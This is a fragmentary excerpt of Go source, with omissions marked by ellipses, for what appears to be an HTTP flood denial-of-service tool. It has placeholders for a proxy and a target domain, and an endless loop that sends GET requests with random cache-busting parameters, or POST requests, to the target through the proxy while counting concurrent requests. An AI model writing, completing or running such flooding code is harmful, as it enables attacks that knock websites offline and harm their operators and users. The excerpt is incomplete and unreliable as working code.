...
// INSERT PROXY AND TARGET DOMAIN
// PROXY: http://<ip>:<port>
var proxy_test string = ""
var target string = ""
...
func main() {
	fmt.Println("Hello", target, "from", proxy_test)
	var (
		version bool
		site    string
		agents  string
	...
	flag.StringVar(&site, "site", target, "Destination site.")
...
func httpcall(url1 string, host string, data string, headers arrayFlags, s chan uint8) {
	atomic.AddInt32(&cur, 1)

	proxyUrl, err := url.Parse(proxy_test)
	if err != nil {
		panic(err)
	}
	...
	for {
		...
		if data == "" {
			q, err = http.NewRequest("GET", url1+param_joiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
		} else {
			q, err = http.NewRequest("POST", url1, strings.NewReader(data))
		}
